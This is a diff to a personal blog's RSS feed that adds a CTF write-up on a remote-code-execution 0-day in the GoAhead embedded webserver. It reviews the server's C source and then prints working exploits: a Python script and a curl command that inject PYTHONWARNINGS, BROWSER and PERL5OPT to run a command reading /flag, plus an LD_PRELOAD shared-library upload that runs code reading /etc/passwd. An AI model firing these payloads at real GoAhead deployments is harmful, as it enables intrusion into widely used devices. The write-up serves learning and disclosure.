@@ -5,12 +5,296 @@
     <link>https://ahmed-belkahla.me/</link>
       <atom:link href="https://ahmed-belkahla.me/index.xml" rel="self" type="application/rss+xml" />
     <description>Ahmed Belkahla</description>
-    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Ahmed Belkahla, 2021</copyright><lastBuildDate>Sun, 11 Apr 2021 00:20:00 +0000</lastBuildDate>
+    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Ahmed Belkahla, 2021</copyright><lastBuildDate>Tue, 12 Oct 2021 00:00:00 +0000</lastBuildDate>
     <image>
       <url>https://ahmed-belkahla.me/img/me.jpg</url>
       <title>Ahmed Belkahla</title>
       <link>https://ahmed-belkahla.me/</link>
     </image>
+    
+    <item>
+      <title>PBCTF 2021 - RCE 0-Day in Goahead Webserver</title>
+      <link>https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/</link>
+      <pubDate>Tue, 12 Oct 2021 00:00:00 +0000</pubDate>
+      <guid>https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/</guid>
+      <description>&lt;h1 id=&#34;2-methods-rce-0-day-in-goahead-webserver-pbctf-2021&#34;&gt;2 methods RCE 0-Day in Goahead Webserver: PBCTF 2021&lt;/h1&gt;
+&lt;p&gt;Last weekend I participated with my team Zer0pts in PBCTF 2021 and we got the 5th place, we were really close to secure a spot in the top 3 but an error in Wine while solving a shitty misc challenge prived us from this win :(&lt;/p&gt;
+&lt;p&gt;However, the CTF had some challenges tagged as &lt;strong&gt;pb2own&lt;/strong&gt; that needed us to find a 0-day in order to solve them. I have passed almost all the time focusing on advancement web challenge that aimed to find an RCE in &lt;strong&gt;goahead&lt;/strong&gt; webserver.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;GoAhead is the world&amp;rsquo;s most popular, tiny embedded web server. It is compact, secure &lt;code&gt;wondering if it&#39;s really secure haha&lt;/code&gt; and simple to use. GoAhead is deployed in hundreds of millions of devices and is ideal for the smallest of embedded devices&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;We managed to achieve RCE in two methods, one that worked on the challenge and another one that was theoretical and not stable but it’s worth mentioning. So without more introduction let’s jump to the analysis of how we did the code review of this huge C code.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Note:&lt;/em&gt; the lesson of the day is that whenever you hit a wall just ping @st98 senpai .&lt;/p&gt;
+&lt;h3 id=&#34;initial-thoughts&#34;&gt;Initial Thoughts:&lt;/h3&gt;
+&lt;p&gt;@st98 senpai firstly mentioned that we have the latest version of goahead running with some simple cgi binary and basic configuration.
+I started by understanding the inner working of goahead server. &lt;strong&gt;
+&lt;a href=&#34;[goahead.c]%28https://github.com/embedthis/goahead/blob/master/src/goahead.c%29&#34;&gt;goahead.c&lt;/a&gt;&lt;/strong&gt; file has the main function where it parses the configuration files and the CLI args but it has nothing important in our case. I jumped then to &lt;strong&gt;http.c&lt;/strong&gt; where the main logic of handling the HTTP requests is there. We can see that after parsing the different HTTP headers, it stores all the information in a structure named Webs that is declared in &lt;strong&gt;goahead.h&lt;/strong&gt; as follow:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;typedef struct Webs {
+    WebsBuf         rxbuf;              /**&amp;lt; Raw receive buffer */
+    WebsBuf         input;              /**&amp;lt; Receive buffer after de-chunking */
+    WebsBuf         output;             /**&amp;lt; Transmit buffer after chunking */
+    WebsBuf         chunkbuf;           /**&amp;lt; Pre-chunking data buffer */
+    WebsBuf         *txbuf;
+    WebsTime        since;              /**&amp;lt; Parsed if-modified-since time */
+    WebsTime        timestamp;          /**&amp;lt; Last transaction with browser */
+    WebsHash        vars;               /**&amp;lt; CGI standard variables */
+    int             timeout;            /**&amp;lt; Timeout handle */
+    char            ipaddr[ME_MAX_IP];  /**&amp;lt; Connecting ipaddress */
+    char            ifaddr[ME_MAX_IP];  /**&amp;lt; Local interface ipaddress */
+
+    int             rxChunkState;       /**&amp;lt; Rx chunk encoding state */
+    ssize           rxChunkSize;        /**&amp;lt; Rx chunk size */
+.
+.
+.
+.
+    WebsHash        responseCookies;    /**&amp;lt; Outgoing cookies */
+    struct WebsSession *session;        /**&amp;lt; Session record */
+    struct WebsRoute *route;            /**&amp;lt; Request route */
+    struct WebsUser *user;              /**&amp;lt; User auth record */
+.
+.
+. 
+#if ME_GOAHEAD_UPLOAD
+    int             upfd;               /**&amp;lt; Upload file handle */
+    WebsHash        files;              /**&amp;lt; Uploaded files */
+    char            *boundary;          /**&amp;lt; Mime boundary (static) */
+    ssize           boundaryLen;        /**&amp;lt; Boundary length */
+    int             uploadState;        /**&amp;lt; Current file upload state */
+    WebsUpload      *currentFile;       /**&amp;lt; Current file context */
+    char            *clientFilename;    /**&amp;lt; Current file filename */
+    char            *uploadTmp;         /**&amp;lt; Current temp filename for upload data */
+    char            *uploadVar;         /**&amp;lt; Current upload form variable name */
+#endif
+    void            *ssl;               /**&amp;lt; SSL context */
+} Webs;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then you can see its initialization here &lt;strong&gt;
+&lt;a href=&#34;https://github.com/embedthis/goahead/blob/master/src/http.c#L361&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L361&lt;/a&gt;&lt;/strong&gt; which seems logic, along with the other functions it only parses the different elements of the HTTP request.
+Honestly I didn&amp;rsquo;t pay close attention on parsing issues since I believed ( my intuition let&amp;rsquo;s say xD) that we will have to abuse or chain something related to CGI binaries execution. However it was worth giving a look at &lt;code&gt;websValidateUriPath&lt;/code&gt; function that calls &lt;code&gt;websNormalizeUriPath&lt;/code&gt; &lt;strong&gt;
+&lt;a href=&#34;https://github.com/embedthis/goahead/blob/master/src/http.c#L2789&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L2789&lt;/a&gt;&lt;/strong&gt; and see if it has any url decoding issues that can lead for example to a path traversal but afaik and after some trials I didn&amp;rsquo;t see anything suspicious. No double Url encoding or altering paths techniques worked.&lt;/p&gt;
+&lt;h3 id=&#34;path-traversal-on-the-cgi-binary&#34;&gt;Path traversal on the CGI binary:&lt;/h3&gt;
+&lt;p&gt;The first idea I got was trying to achieve path traversal somewhere in the cgi handler.I started reviewing &lt;strong&gt;
+&lt;a href=&#34;https://github.com/embedthis/goahead/blob/master/src/cgi.c&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;cgi.c&lt;/a&gt;&lt;/strong&gt; file and I noticed that we have full control of the arguments passed to the cgi binary as mentioned in this part of code:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;    *argp = cgiPath;
+    n = 1;
+    query = 0;
+
+    if (strchr(wp-&amp;gt;query, &#39;=&#39;) == NULL) {
+        query = sclone(wp-&amp;gt;query);
+        websDecodeUrl(query, query, strlen(query));
+        for (cp = stok(query, &amp;quot; &amp;quot;, &amp;amp;tok); cp != NULL &amp;amp;&amp;amp; argp != NULL; ) {
+            *(argp+n) = cp;
+            trace(5, &amp;quot;ARG[%d] %s&amp;quot;, n, argp[n-1]);
+            n++;
+            if (n &amp;gt;= argpsize) {
+                argpsize *= 2;
+                if (argpsize &amp;gt; ME_GOAHEAD_LIMIT_CGI_ARGS) {
+                    websError(wp, HTTP_CODE_REQUEST_TOO_LARGE, &amp;quot;Too many arguments&amp;quot;);
+                    wfree(cgiPath);
+                    return 1;
+                }
+                argp = wrealloc(argp, argpsize * sizeof(char *));
+            }
+            cp = stok(NULL, &amp;quot; &amp;quot;, &amp;amp;tok);
+        }
+    }
+    *(argp+n) = NULL;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Besically if there is no &lt;code&gt;=&lt;/code&gt; in our query the webserver will url decode again the query, split it by &amp;quot; &amp;quot; and then pass the result as the args array. So the following url &lt;code&gt;http://advancement.perfect.blue/cgi-binary/date?aa%20dd&lt;/code&gt; will result in &lt;code&gt;aa&lt;/code&gt; and &lt;code&gt;dd&lt;/code&gt; passed as arguments.
+So if we can somehow run for example /bin/sh instead of the intended cgi binary we can have an easy win and run the following payload for example &lt;code&gt;bin/sh -c {command}&lt;/code&gt;.
+Unfortunately after a lot of trials this method wasn&amp;rsquo;t possible because of the following part of code that was sanitizing the CGI filename:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;    getcwd(cwd, ME_GOAHEAD_LIMIT_FILENAME);
+    dir = wp-&amp;gt;route-&amp;gt;dir ? wp-&amp;gt;route-&amp;gt;dir : cwd;
+    chdir(dir);
+
+    extraPath = 0;
+    if ((cp = strchr(cgiName, &#39;/&#39;)) != NULL) {
+        extraPath = sclone(cp);
+        *cp = &#39;\0&#39;;
+        websSetVar(wp, &amp;quot;PATH_INFO&amp;quot;, extraPath);
+        websSetVarFmt(wp, &amp;quot;PATH_TRANSLATED&amp;quot;, &amp;quot;%s%s%s&amp;quot;, dir, cgiPrefix, extraPath);
+        wfree(extraPath);
+    } else {
+        websSetVar(wp, &amp;quot;PATH_INFO&amp;quot;, &amp;quot;&amp;quot;);
+        websSetVar(wp, &amp;quot;PATH_TRANSLATED&amp;quot;, &amp;quot;&amp;quot;);
+    }
+    cgiPath = sfmt(&amp;quot;%s%s/%s&amp;quot;, dir, cgiPrefix, cgiName);
+    websSetVarFmt(wp, &amp;quot;SCRIPT_NAME&amp;quot;, &amp;quot;%s/%s&amp;quot;, cgiPrefix, cgiName);
+    websSetVar(wp, &amp;quot;SCRIPT_FILENAME&amp;quot;, cgiPath);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The code is simple, it replaces the first &lt;code&gt;/&lt;/code&gt; in cgiName with a null byte so the cgiName cannot hold any path traversal payload like &lt;code&gt;../../&lt;/code&gt; since it will be trimmed. I tried a lot of stuffs and manipulations in order to bypass this restriction like using double url encodings but in vain.
+One idea I had faith in, was trying to find some misconsistency in the url decoding logic of the webserver, if we can force another urldecoding operation after passing the check we will have an easy win. After some intense  review of the cgi component and different other components I couldn&amp;rsquo;t achieve it :( I wished that this line was urldecoding the whole path &lt;strong&gt;
+&lt;a href=&#34;https://github.com/embedthis/goahead/blob/master/src/cgi.c#L193&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L193&lt;/a&gt;&lt;/strong&gt; :&#39;(&lt;/p&gt;
+&lt;h3 id=&#34;abusing-environment-variables&#34;&gt;Abusing Environment variables:&lt;/h3&gt;
+&lt;p&gt;After a lot of trials I gave up on the idea of running another cgi binary and do path traversal and started focusing on how environment variables are handled. This part of code is the most juicy one:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c=&#34;&gt;    envpsize = 64;
+    envp = walloc(envpsize * sizeof(char*));
+    if (wp-&amp;gt;vars) {
+        for (n = 0, s = hashFirst(wp-&amp;gt;vars); s != NULL; s = hashNext(wp-&amp;gt;vars, s)) {
+            if (s-&amp;gt;content.valid &amp;amp;&amp;amp; s-&amp;gt;content.type == string) {
+                vp = strim(s-&amp;gt;name.value.string, &amp;quot; \t\r\n&amp;quot;, WEBS_TRIM_BOTH);
+                for (bp = envBlackList; *bp; bp++) {
+                    if (smatch(vp, *bp)) {
+                        continue;
+                    }
+                }
+                if (sstarts(vp, &amp;quot;LD_&amp;quot;) || sstarts(vp, &amp;quot;LDR_&amp;quot;) || sstarts(vp, &amp;quot;_RLD&amp;quot;) || sstarts(vp, &amp;quot;DYLD_&amp;quot;) || strstr(vp, &amp;quot;=()&amp;quot;)) {
+                    continue;
+                }
+                if (s-&amp;gt;arg != 0 &amp;amp;&amp;amp; *ME_GOAHEAD_CGI_VAR_PREFIX != &#39;\0&#39;) {
+                    envp[n++] = sfmt(&amp;quot;%s%s=%s&amp;quot;, ME_GOAHEAD_CGI_VAR_PREFIX, s-&amp;gt;name.value.string,
+                        s-&amp;gt;content.value.string);
+                } else {
+                    envp[n++] = sfmt(&amp;quot;%s=%s&amp;quot;, s-&amp;gt;name.value.string, s-&amp;gt;content.value.string);
+                }
+                trace(0, &amp;quot;Env[%d] %s&amp;quot;, n, envp[n-1]);
+                if (n &amp;gt;= envpsize) {
+                    envpsize *= 2;
+                    envp = wrealloc(envp, envpsize * sizeof(char *));
+                }
+            }
+        }
+    }
+    *(envp+n) = NULL;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The most trained eye noticed the filter that prohibits using the known LD_* env vars and some other sensible ones. Tl;DR we can only set arbitrary environement variables but with &lt;code&gt;CGI_&lt;/code&gt; prefix. You can also notice that it&amp;rsquo;s setting &lt;code&gt;wp-&amp;gt;vars&lt;/code&gt; content as env vars too (wp is Webs structure that is set in **http.c** as we mentioned in the beginning).&lt;/p&gt;
+&lt;p&gt;Looking at &lt;strong&gt;http.c&lt;/strong&gt; file again we can see at &lt;strong&gt;
+&lt;a href=&#34;https://github.com/embedthis/goahead/blob/master/src/http.c#L1081&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L1081 &lt;/a&gt;&lt;/strong&gt; how &lt;code&gt;wp-&amp;gt;vars&lt;/code&gt; is set:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c=&#34;&gt;        upperKey = sfmt(&amp;quot;HTTP_%s&amp;quot;, key);
+        for (cp = upperKey; *cp; cp++) {
+            if (*cp == &#39;-&#39;) {
+                *cp = &#39;_&#39;;
+            }
+        }
+        supper(upperKey);
+        if ((prior = websGetVar(wp, upperKey, 0)) != 0) {
+            combined = sfmt(&amp;quot;%s, %s&amp;quot;, prior, value);
+            websSetVar(wp, upperKey, combined);
+            wfree(combined);
+        } else {
+            websSetVar(wp, upperKey, value);
+        }
+        wfree(upperKey);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;You can notice that any HTTP header we send is added to &lt;code&gt;wp-&amp;gt;vars&lt;/code&gt; after concatenating the prefix &lt;code&gt;HTTP_&lt;/code&gt; so we can also set arbitrary environment variables with &lt;code&gt;HTTP_&lt;/code&gt; as a prefix but we can&amp;rsquo;t do a lot of stuffs because of these restrictions.&lt;/p&gt;
+&lt;p&gt;At this part I didn&amp;rsquo;t know what to do next so I started digging in the code and in other components hoping that I can find something useful until @st98 senpai sent the following in the discord channel of the team:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/tn0QELk.png&#34; alt=&#34;DISCORD&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Honestly we didn&amp;rsquo;t know at first why this happened, but let&amp;rsquo;s take a look at &lt;strong&gt;http.c&lt;/strong&gt; file at &lt;strong&gt;
+&lt;a href=&#34;https://github.com/embedthis/goahead/blob/master/src/http.c#L1404&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L1404&lt;/a&gt;&lt;/strong&gt; . You can see from the code that it&amp;rsquo;s adding form data to &lt;code&gt;wp-&amp;gt;vars&lt;/code&gt; without any prior sanitization and as we mentioned &lt;code&gt;wp-&amp;gt;vars&lt;/code&gt; was added to the environment variables:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c=&#34;&gt;static void addFormVars(Webs *wp, char *vars)
+{
+    WebsKey     *sp;
+    cchar       *prior;
+    char        *keyword, *value, *tok;
+
+    assert(wp);
+    assert(vars);
+
+    keyword = stok(vars, &amp;quot;&amp;amp;&amp;quot;, &amp;amp;tok);
+    while (keyword != NULL) {
+        if ((value = strchr(keyword, &#39;=&#39;)) != NULL) {
+            *value++ = &#39;\0&#39;;
+            websDecodeUrl(keyword, keyword, strlen(keyword));
+            websDecodeUrl(value, value, strlen(value));
+        } else {
+            value = &amp;quot;&amp;quot;;
+        }
+        if (*keyword) {
+            /*
+                If keyword has already been set, append the new value to what has been stored.
+             */
+            if ((prior = websGetVar(wp, keyword, NULL)) != 0) {
+                sp = websSetVarFmt(wp, keyword, &amp;quot;%s %s&amp;quot;, prior, value);
+            } else {
+                sp = websSetVar(wp, keyword, value);
+            }
+            /* Flag as untrusted keyword by setting arg to 1. This is used by CGI to prefix this keyword */
+            sp-&amp;gt;arg = 1;
+        }
+        keyword = stok(NULL, &amp;quot;&amp;amp;&amp;quot;, &amp;amp;tok);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;first-method-rce-worked-in-the-challenge&#34;&gt;First method RCE (worked in the challenge):&lt;/h3&gt;
+&lt;p&gt;So now that we are able to set any environment variables, we started digging on how we would  achieve RCE. The first idea we got is to use the known &lt;code&gt;LD_PRELOAD &lt;/code&gt; trick, if we manage to upload our shared library in the server with a known path we will have our win but it won&amp;rsquo;t be that easy so we will talk more in details about this approach in the next section.&lt;/p&gt;
+&lt;p&gt;After a lot of tries and reflection, @st98 senpai sent this interesting 
+&lt;a href=&#34;https://www.elttam.com/blog/env/#content&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;article&lt;/a&gt;, it&amp;rsquo;s talking about achieving RCE while running a python script by using &lt;code&gt;PYTHONWARNINGS&lt;/code&gt; &lt;code&gt;BROWSER&lt;/code&gt; and &lt;code&gt;PERL5OPT&lt;/code&gt; variables. You can find more details about this method in the article mentioned below. So here is our final exploit written by @st98 senpai:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python=&#34;&gt;import socket
+
+#s = socket.create_connection((&#39;localhost&#39;, 5000))
+s = socket.create_connection((&#39;advancement.chal.perfect.blue&#39;, 80))
+payload = &#39;&#39;&#39;--------------------------58ffd05745ad3119
+Content-Disposition: form-data; name=&amp;quot;PYTHONWARNINGS&amp;quot;
+
+all:0:antigravity.x:0:0
+--------------------------58ffd05745ad3119
+Content-Disposition: form-data; name=&amp;quot;BROWSER&amp;quot;
+
+perlthanks
+--------------------------58ffd05745ad3119
+Content-Disposition: form-data; name=&amp;quot;PERL5OPT&amp;quot;
+
+-Mbase;print(system(&amp;quot;cat&amp;quot;.chr(0x20).&amp;quot;/flag&amp;quot;));exit;
+--------------------------58ffd05745ad3119--
+&#39;&#39;&#39;.replace(&#39;\n&#39;, &#39;\r\n&#39;).encode()
+#payload = payload.replace(b&#39;FILE&#39;, open(&#39;nekodesu.so&#39;, &#39;rb&#39;).read())
+l = len(payload)
+
+body = f&#39;&#39;&#39;POST /cgi-bin/date HTTP/1.1
+Host: localhost:55555
+User-Agent: curl/7.68.0
+Accept: */*
+Content-Length: {l}
+Content-Type: multipart/form-data; boundary=------------------------58ffd05745ad3119
+
+&#39;&#39;&#39;.replace(&#39;\n&#39;, &#39;\r\n&#39;).encode() + payload
+
+s.send(body)
+print(s.recv(1024).decode())
+s.close()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;or using curl as follow:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;curl -F &amp;quot;PYTHONWARNINGS=all:0:antigravity.x:0:0&amp;quot; -F &amp;quot;BROWSER=perlthanks&amp;quot; -F &#39;PERL5OPT=-Mbase;print(system(&amp;quot;cat&amp;quot;.chr(0x20).&amp;quot;/flag&amp;quot;));exit;&#39; http://advancement.chal.perfect.blue
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;second-method-rce-didnt-work-on-the-challenge&#34;&gt;Second Method RCE (Didn&amp;rsquo;t work on the challenge)&lt;/h3&gt;
+&lt;p&gt;As mentioned before, we stick a lot of time trying the &lt;code&gt;LD_PRELOAD&lt;/code&gt; trick, but unfortunately we can see in the challenge docker-compose file that &lt;code&gt;    read_only: true&lt;/code&gt; so forcing an upload will always throw an error since the temporary files created while uploading will be stored in &lt;code&gt;/etc/goahead/tmp&lt;/code&gt; . The &lt;code&gt;/tmp&lt;/code&gt; is writable so at first I thought that we have maybe to find another vulnerability while forging the path of the temporary file but we had no luck.&lt;/p&gt;
+&lt;p&gt;After the end of the CTF, I didn&amp;rsquo;t give up on this idea and sticked trying it in a normal environment with writable FS. You may be asking now that even if we managed to upload the shared library we will still have to brute force/guess the name of the temporary file ? In fact after some intense code review of the upload component I noticed the following while handling the uploaded file &lt;strong&gt;
+&lt;a href=&#34;https://github.com/embedthis/goahead/blob/master/src/upload.c#L240&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L240&lt;/a&gt;&lt;/strong&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c=&#34;&gt;wfree(wp-&amp;gt;uploadTmp);
+ if ((wp-&amp;gt;uploadTmp = websTempFile(uploadDir, &amp;quot;tmp&amp;quot;)) == 0) {
+          websError(wp, HTTP_CODE_INTERNAL_SERVER_ERROR,
+          &amp;quot;Cannot create upload temp file %s. Check upload temp dir %s&amp;quot;, wp-&amp;gt;uploadTmp, uploadDir);
+          return;
+      }
+      trace(5, &amp;quot;File upload of: %s stored as %s&amp;quot;, wp-&amp;gt;clientFilename, wp-&amp;gt;uploadTmp);
+
+if ((wp-&amp;gt;upfd = open(wp-&amp;gt;uploadTmp, O_WRONLY | O_CREAT | O_TRUNC | O_BINARY, 0600)) &amp;lt; 0) {
+        websError(wp, HTTP_CODE_INTERNAL_SERVER_ERROR, &amp;quot;Cannot open upload temp file %s&amp;quot;, wp-&amp;gt;uploadTmp);
+        return;
+        }
+               
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The webserver is opening the file so we may abuse the opened file descriptor and for example set the &lt;code&gt;LD_PRELOAD=/proc/self/fd/6&lt;/code&gt; while forcing a file upload of the shared library. We can do it using the following command:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;curl -v -F &amp;quot;data=@payload.so&amp;quot; -F &amp;quot;LD_PRELOAD=/proc/self/fd/6&amp;quot; http://advancement.chal.perfect.blue/cgi-bin/date
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;with &lt;code&gt;payload.so&lt;/code&gt;  having the following before compiling it:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;unistd.h&amp;gt;
+
+static void before_main(void) __attribute__((constructor));
+
+static void before_main(void)
+{
+    system(&amp;quot;cat /etc/passwd&amp;quot;);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;However, this method have some constraints that make it hard to exploit :/
+&lt;strong&gt;1-&lt;/strong&gt; We have to guess the file descriptor number ( We can bruteforce it easily)
+&lt;strong&gt;2-&lt;/strong&gt; Weirdly goahead had different behaviours that I didn&amp;rsquo;t really understand depending on different environements, it throws an internal server error for an unknown reason sometimes. ( Please if you manage to know why DM me )&lt;/p&gt;
+&lt;h3 id=&#34;conclusion&#34;&gt;Conclusion:&lt;/h3&gt;
+&lt;p&gt;PBCTF 2021 was really fun and hard, it had some awesome challenges that required finding a 0-day in some products in order to solve them, so it was a highly realistic CTF. Kudos to all my awesome teammates in Zer0pts that have really motivated me to be more dedicated to CTFs and learned a lot from them.&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>AngstromCTF Web Writeups</title>
